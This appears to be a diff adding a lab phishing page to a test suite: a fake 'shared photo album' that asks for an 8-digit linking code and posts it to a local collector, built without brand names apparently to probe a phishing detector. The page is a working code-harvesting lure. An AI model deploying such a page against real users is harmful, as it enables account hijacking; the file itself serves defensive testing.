@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Shared album</title></head>   <!-- deliberately NO protected brand in the title -->
+<body>
+  <h1>Shared photo album</h1>
+  <p style="color:#a00">LAB ATTACK PAGE - linking-code scam, NO protected brand. Fake data only.</p>
+  <p>A friend shared 12 photos. Enter the linking code to view them.</p>
+  <input name="code" placeholder="8-digit linking code">
+  <button type="button" id="view">View album</button>
+  <script>
+    document.getElementById("view").addEventListener("click", () => {
+      const code = document.querySelector('input[name="code"]').value;
+      fetch("http://127.0.0.1:8002/collect", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "linking_code=" + encodeURIComponent(code),
+      });
+    });
+  </script>
+</body></html>
